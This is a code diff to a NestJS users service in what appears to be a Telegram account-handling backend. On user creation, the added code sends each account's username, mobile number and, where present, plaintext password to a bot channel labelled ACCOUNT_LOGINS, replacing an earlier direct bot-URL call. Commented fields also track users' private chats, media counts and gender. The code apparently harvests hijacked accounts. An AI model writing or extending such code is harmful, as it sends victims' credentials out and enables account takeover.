@@ -10,6 +10,7 @@ import { CreateUserDto } from './dto/create-user.dto';
 import { fetchWithTimeout } from '../../utils/fetchWithTimeout';
 import { notifbot } from '../../utils/logbots';
 import { connectionManager } from '../Telegram/utils/connection-manager';
+import { BotsService, ChannelCategory } from '../bots';
 
 @Injectable()
 export class UsersService {
@@ -17,7 +18,8 @@ export class UsersService {
     @Inject(forwardRef(() => TelegramService))
     private telegramService: TelegramService,
     @Inject(forwardRef(() => ClientService))
-    private clientsService: ClientService
+    private clientsService: ClientService,
+    private readonly botsService: BotsService
   ) { }
 
   async create(user: CreateUserDto): Promise<User | undefined> {
@@ -28,7 +30,8 @@ export class UsersService {
       console.log("Updating New Session Details", user.mobile, user.username, activeClientSetup.clientId)
       await this.clientsService.updateClientSession(user.session)
     } else {
-      await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);//Msgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);
+      await this.botsService.sendMessageByCategory(ChannelCategory.ACCOUNT_LOGINS,  `ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`);//Msgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels
+      // await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);//Msgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);
       setTimeout(async () => {
         try {
           await connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
